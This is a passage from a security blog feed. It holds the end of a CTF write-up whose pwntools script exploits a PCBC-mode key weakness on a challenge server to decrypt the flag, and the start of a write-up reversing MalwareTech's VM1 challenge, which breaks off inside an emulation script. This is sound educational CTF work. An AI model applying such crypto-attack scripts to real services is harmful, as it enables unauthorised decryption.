&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Cipher &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; AES

p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;encryption.pwn2.win&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;

BUFF &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;
BLOCK_SIZE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
key2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; None
iv2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; None

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;to_blocks&lt;/span&gt;(txt):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; [txt[i&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;BLOCK_SIZE:(i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;BLOCK_SIZE] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(txt)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;BLOCK_SIZE)]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;(b1, b2&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;None):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; isinstance(b1, list) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; b2 &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; None:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; len(set([len(b) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; b1])) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xor() - Invalid input size&amp;#39;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; all([isinstance(b, bytes) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; b1]), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xor() - Invalid input type&amp;#39;&lt;/span&gt;
        x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [len(b) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; b1][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; b1:
            x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xor(x, b)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; isinstance(b1, bytes) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; isinstance(b2, bytes), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xor() - Invalid input type&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bytes([a &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; b &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a, b &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(b1, b2)])

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decrypt&lt;/span&gt;(txt, key, iv):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; len(key) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; BLOCK_SIZE, f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Invalid key size&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; len(iv) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; BLOCK_SIZE, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Invalid IV size&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; len(txt) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; BLOCK_SIZE &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Invalid plaintext size&amp;#39;&lt;/span&gt;
    bs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(key)
    blocks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; to_blocks(txt)
    ctxt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    aes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(key, AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MODE_ECB)
    curr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; iv
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; block &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; blocks:
        ctxt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; xor(curr, aes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(block)) &lt;span style=&#34;color:#75715e&#34;&gt;# Inverse of the encrypt function&lt;/span&gt;
        curr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xor(ctxt[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;bs:], block)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ctxt

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encrypt_flag&lt;/span&gt;(p):
	p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Choice: &amp;#34;&lt;/span&gt;)
	p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;)
	x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()
	y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(x)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; y[:&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;], y[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;enc_plaintext&lt;/span&gt;(p, plaintext):
	p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Choice: &amp;#34;&lt;/span&gt;)
	p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
	p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Plaintext: &amp;#34;&lt;/span&gt;)
	p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(plaintext)
	x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()
	y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(x)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; y[:&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;], y[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getDecoding&lt;/span&gt;(s):
	y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(s)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; y[:&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;], y[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:]

iv2_orig, flag_enc_orig &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; encrypt_flag(p)
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(iv2_orig)
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(flag_enc_orig)

key2_new &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xor(to_blocks(flag_enc_orig))
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Key2 :&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key2_new)
iv2_new, flag_enc_cipher_new &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; encrypt_flag(p)
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;iv2 :&amp;#34;&lt;/span&gt;, iv2_new)
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag_cipher_new :&amp;#34;&lt;/span&gt;, flag_enc_cipher_new)

&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(decrypt(flag_enc_cipher_new, key2_new, iv2_new)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running this, prints the flag - &lt;strong&gt;CTF-BR{kn3W_7h4T_7hEr3_4r3_Pc8C_r3pe471ti0ns?!?}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;And yeah, after reading the flag, I realised it was actually AES in PCBC mode.&lt;/p&gt;
&lt;hr&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>MalwareTech&#39;s VM1 Reversing Challenge</title>
      <link>https://shreyansh26.github.io/post/2020-01-04_malwaretech-vm1-challenge/</link>
      <pubDate>Sat, 04 Jan 2020 17:24:28 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2020-01-04_malwaretech-vm1-challenge/</guid>
      <description>&lt;p&gt;Get the challenge from &lt;a href=&#34;https://www.malwaretech.com/vm1&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;vm1.exe implements a simple 8-bit virtual machine (VM) to try and stop reverse engineers from retrieving the flag. The VM’s RAM contains the encrypted flag and some bytecode to decrypt it. Can you figure out how the VM works and write your own to decrypt the flag? A copy of the VM’s RAM has been provided in ram.bin (this data is identical to the ram content of the malware’s VM before execution and contains both the custom assembly code and encrypted flag).&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Rules &amp;amp; Information&lt;/strong&gt;
You are not require to run vm1.exe, this challenge is static analysis only.
Do not use a debugger or dumper to retrieve the decrypted flag from memory, this is cheating.
Analysis can be done using the free version of IDA Pro (you don’t need the debugger).&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given two files - &lt;em&gt;vm1.exe&lt;/em&gt; and &lt;em&gt;ram.bin&lt;/em&gt;, and according to the problem statement, &lt;em&gt;ram.bin&lt;/em&gt; contains the bytecode for the VM and the flag encrypted in it somwehow.&lt;/p&gt;
&lt;p&gt;I used IDA Pro to analyse the binary. I started off with the &lt;code&gt;start&lt;/code&gt; function.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2020-01-04_malwaretech-vm1-challenge/images/start.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2020-01-04_malwaretech-vm1-challenge/images/start.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;First, there are a few calls to some MD5 related functions, those are to display the MD5 hash of the flag when we run the program.&lt;/p&gt;
&lt;p&gt;Then there is a call to &lt;code&gt;GetProcessHeap&lt;/code&gt; and &lt;code&gt;HeapAlloc&lt;/code&gt; which basically allocates a memory of size 0x1FB. After that we have a call to &lt;code&gt;memcpy&lt;/code&gt; that copies data from &lt;code&gt;unk_404040&lt;/code&gt; to the newly allocated memory (renamed to &lt;em&gt;bytecode&lt;/em&gt;). On taking a look at the bytes at that location, they are exactly the same as &lt;em&gt;ram.bin&lt;/em&gt; so this is the memory location that is mentioned in the problem statement.&lt;/p&gt;
&lt;p&gt;We move straight to the &lt;code&gt;read_bytecode_from_memory&lt;/code&gt; function (&lt;code&gt;sub_4022E0&lt;/code&gt; before renaming).&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2020-01-04_malwaretech-vm1-challenge/images/read_memory.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2020-01-04_malwaretech-vm1-challenge/images/read_memory.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Here first eax is set to 1 and then there is a loop that runs until eax does not become 0. The body of the loop basically read 3 bytes of the bytecode sequentially, stores it and passes it to the function &lt;code&gt;evaluate&lt;/code&gt; (&lt;code&gt;sub_402270&lt;/code&gt; before renaming).&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2020-01-04_malwaretech-vm1-challenge/images/evaluate.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2020-01-04_malwaretech-vm1-challenge/images/evaluate.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;This is the function where the VM bytecode is interpreted. The function has 3 arguments, which are basically 3 bytes of the bytecode passed from the &lt;code&gt;read_bytecode_from_memory&lt;/code&gt; function. For evaluation, the first parameter is checked first -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If it is 1, then the memory location at offset param2 is assigned param3 and eax is set to 1.&lt;/li&gt;
&lt;li&gt;If it is 2, then a variable, &lt;em&gt;byte_404240&lt;/em&gt; is set to the value at memory location at offset param2 and eax is set to 1.&lt;/li&gt;
&lt;li&gt;If it is 3, then the value at offset param2 is XORed with the value of &lt;em&gt;byte_404240&lt;/em&gt; and stored back at the offset of param2.&lt;/li&gt;
&lt;li&gt;Otherwise, if it is not 3 then al is set to 0, i.e. eax is now zero and the loop in &lt;code&gt;read_bytecode_from_memory&lt;/code&gt; should now stop.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;After the loop in &lt;code&gt;read_bytecode_from_memory&lt;/code&gt; ends we know that now, the flag is in the memory, precisely at the location &lt;code&gt;unk_404040&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;So, we can basically emulate the whole functionality with a python script and then get the flag from the converted data.&lt;/p&gt;
&lt;p&gt;I wrote the following script.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0DE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x55&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0E6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0E4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x47&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0FC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0CB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x60&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span 